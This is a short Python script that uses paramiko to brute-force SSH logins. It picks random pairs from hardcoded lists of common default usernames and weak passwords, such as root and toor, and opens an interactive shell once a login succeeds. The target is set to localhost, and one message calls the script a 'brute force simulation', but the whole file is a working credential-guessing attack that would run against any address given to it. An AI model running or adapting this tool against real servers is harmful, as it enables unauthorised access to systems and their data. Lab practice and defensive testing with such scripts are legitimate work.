import paramiko
import time
import random


def ssh_client(server_ip, server_port, username_list, password_list, max_attempts=10):
    attempts = 0
    while attempts < max_attempts:
        username = random.choice(username_list)
        password = random.choice(password_list)
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            print(
                f"Attempting to connect to {server_ip}:{server_port} with Username: {username} and Password: {password}...")
            client.connect(server_ip, port=server_port, username=username, password=password)

            channel = client.invoke_shell()
            print("Connected! Enter commands below. Type 'exit' to quit.\n")

            while True:
                output = ""
                while channel.recv_ready():
                    output += channel.recv(1024).decode('utf-8')
                if output:
                    print(output, end="")

                command = input("$ ")
                if command.lower() == 'exit':
                    print("Exiting...")
                    break
                channel.send(command + '\n')
                time.sleep(0.1)

            channel.close()
            client.close()
            break  # stop if successful
        except Exception as e:
            attempts += 1
            print(f"Attempt {attempts} failed: {e}")
            if attempts >= max_attempts:
                print(f"Brute force simulation completed with {max_attempts} failed attempts.")
                break
            time.sleep(1)


if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 22

    USERNAME_LIST = [
        "admin", "root", "administrator", "user", "guest", "test", "support",
        "webmaster", "manager", "info", "staff", "developer", "default", "user1",
        "sysadmin", "operator", "login", "qwerty", "demo", "student", "service"
    ]

    PASSWORD_LIST = [
        "123456", "password", "12345", "admin", "letmein", "welcome", "qwerty",
        "password123", "abc123", "123qwe", "1q2w3e4r", "admin123", "root", "toor"
    ]

    ssh_client(SERVER_IP, SERVER_PORT, USERNAME_LIST, PASSWORD_LIST)